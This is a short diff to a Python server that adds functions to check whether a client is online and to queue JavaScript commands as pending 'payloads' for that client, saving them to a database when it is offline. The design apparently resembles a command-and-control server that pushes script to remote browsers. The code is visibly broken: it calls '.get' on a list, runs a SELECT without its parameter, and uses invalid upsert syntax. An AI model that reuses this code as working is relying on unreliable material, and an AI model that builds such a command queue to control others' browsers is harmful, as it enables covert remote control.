@@ -48,6 +48,20 @@ def construct_response(clientid):
 
     return resp
 
+def is_online(clientid):
+    found = [cl for cl, sid in app.connected_clients if cl == clientid].get(0, None)
+    return 0 if found == None else 1
+
+
+def add_js_cmd(clientid, cmd):
+    if is_online(clientid):
+        pending_payloads[clientid]["js-cmd"].append(cmd)
+    else:
+        with getConn() as conn:
+            conn.execute('SELECT Payload FROM PendingPayloads WHERE ClientID = %s')
+            payload = json.loads(conn.fetchone()[0]) if conn.rowcount != 0 else deepcopy(BASE_SERVER_RESPONSE)
+            payload['js-cmd'].append(cmd)
+            conn.execute('insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s) where ClientID=(%s)', (clientid, payload, payload, clientid))
 
 """
 Handles creation of new client.
